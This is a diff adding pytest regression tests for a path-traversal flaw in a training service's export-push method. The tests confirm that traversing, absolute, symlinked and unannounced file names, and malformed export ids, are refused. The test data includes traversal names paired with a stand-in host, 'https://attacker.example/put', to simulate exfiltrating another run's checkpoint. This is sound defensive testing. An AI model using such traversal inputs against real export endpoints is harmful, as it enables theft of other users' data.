@@ -30,6 +30,7 @@ method did.
 from __future__ import annotations
 
 import json
+import pathlib
 
 import pytest
 
@@ -301,6 +302,143 @@ async def test_export_model_RECORDS_the_calling_identity(monkeypatch):
     # And the identity it recorded is usable by the creator and nobody else.
     assert training.caller_may_use_export(out["export_id"], MINE) is True
     assert training.caller_may_use_export(out["export_id"], THEIRS) is False
+
+
+# ── the names a push may carry ──────────────────────────────────────────────
+#
+# Found by the first review of this change, reproduced against the real method:
+# binding the handle to its creator closed "somebody else's export id" and left
+# "your own id" wide open. The caller supplies the `files` keys, they were
+# joined to the package directory unchecked, and a creator could push
+# "../../<another run>/best.pt" -- another run's checkpoint -- to a URL of
+# their choosing.
+
+
+@pytest.mark.asyncio
+async def test_a_TRAVERSING_file_name_cannot_reach_another_runs_checkpoint(tmp_path):
+    """THE reproduction, with the attack the review actually ran."""
+    pkg = tmp_path / "pkg"
+    pkg.mkdir()
+    (pkg / "weights.pt").write_bytes(b"MY-WEIGHTS")
+    victim = tmp_path / "sessions" / "victim"
+    victim.mkdir(parents=True)
+    (victim / "best.pt").write_bytes(b"VICTIM-WEIGHTS")
+    plant("e-mine", owner=CREATOR, package_dir=pkg)
+
+    streamed = []
+
+    class _Watch:
+        _export_tasks: dict = {}
+
+        async def _put_file(self, url, path, timeout=None):
+            streamed.append((url, pathlib.Path(path).read_bytes()))
+
+            class _R:
+                status_code = 200
+
+                def raise_for_status(self):
+                    return None
+
+            return _R()
+
+    with pytest.raises(training.InvalidPackageMember):
+        await _method("push_export", _Watch())(
+            "e-mine",
+            {"../sessions/victim/best.pt": "https://attacker.example/put"},
+            context=MINE,
+        )
+    assert streamed == [], streamed
+
+
+@pytest.mark.asyncio
+async def test_an_ABSOLUTE_file_name_is_refused_too(tmp_path):
+    """Joining an absolute path discards the directory it was joined to, so
+    this is a separate failure from `../` and not a variant of it."""
+    pkg = tmp_path / "pkg"
+    pkg.mkdir()
+    (pkg / "weights.pt").write_bytes(b"MY-WEIGHTS")
+    secret = tmp_path / "secret.pt"
+    secret.write_bytes(b"NOT-YOURS")
+    plant("e-mine", owner=CREATOR, package_dir=pkg)
+    with pytest.raises(training.InvalidPackageMember):
+        await _method("push_export")(
+            "e-mine", {str(secret): "https://attacker.example/put"}, context=MINE
+        )
+
+
+@pytest.mark.asyncio
+async def test_a_name_the_export_DID_NOT_ANNOUNCE_is_refused(tmp_path):
+    """The allow-list layer on its own: a file that really is inside the
+    package, but is not one this export reported, is still not pushable."""
+    pkg = tmp_path / "pkg"
+    pkg.mkdir()
+    (pkg / "weights.pt").write_bytes(b"MY-WEIGHTS")
+    (pkg / "scratch.bin").write_bytes(b"INTERNAL")
+    plant("e-mine", owner=CREATOR, package_dir=pkg)  # announces weights.pt only
+    with pytest.raises(training.InvalidPackageMember):
+        await _method("push_export")(
+            "e-mine", {"scratch.bin": "https://mine.example/put"}, context=MINE
+        )
+
+
+def test_a_SYMLINK_out_of_the_package_is_refused_by_the_second_layer(tmp_path):
+    """What the allow-list cannot see, and why there are two layers: a name
+    the record announces, pointing out of the package."""
+    pkg = tmp_path / "pkg"
+    pkg.mkdir()
+    outside = tmp_path / "outside.pt"
+    outside.write_bytes(b"NOT-YOURS")
+    (pkg / "weights.pt").symlink_to(outside)
+    with pytest.raises(training.InvalidPackageMember):
+        training.package_member_path(
+            pkg, "weights.pt", announced=[{"name": "weights.pt"}]
+        )
+
+
+def test_the_announced_name_resolves_normally(tmp_path):
+    """Paired with the refusals: a resolver that refused everything would pass
+    every test above."""
+    pkg = tmp_path / "pkg"
+    pkg.mkdir()
+    (pkg / "weights.pt").write_bytes(b"MY-WEIGHTS")
+    got = training.package_member_path(
+        pkg, "weights.pt", announced=[{"name": "weights.pt", "size": 10}]
+    )
+    assert got == (pkg / "weights.pt").resolve()
+    assert got.read_bytes() == b"MY-WEIGHTS"
+
+
+def test_an_export_with_NO_announced_files_can_push_nothing():
+    """Fail closed: a record that never reported its members allows none."""
+    for announced in (None, [], {}, "weights.pt"):
+        with pytest.raises(training.InvalidPackageMember):
+            training.package_member_path("/tmp", "weights.pt", announced=announced)
+
+
+# ── the id itself is a path component ───────────────────────────────────────
+
+
+@pytest.mark.parametrize(
+    "bad",
+    ["../escape", "a/b", "..", "", "with space", "x" * 200, None, 7, ".hidden/../x"],
+)
+def test_an_EXPORT_ID_THAT_IS_NOT_ONE_cannot_become_a_path(bad):
+    """A run id was a traversal until it was checked; this one is the same
+    shape and was never checked."""
+    with pytest.raises(training.InvalidExportId):
+        training.validate_export_id(bad)
+    with pytest.raises(training.InvalidExportId):
+        training.read_export(bad)
+
+
+def test_a_REAL_export_id_still_resolves():
+    """The ids `export_model` mints are uuid4 hex, and the descriptive ids
+    these tests plant must keep working too, or the check would be measuring
+    its own fixtures."""
+    import uuid
+
+    assert training.validate_export_id(uuid.uuid4().hex)
+    assert training.validate_export_id("e-mine") == "e-mine"
 
 
 # ── the schema ──────────────────────────────────────────────────────────────
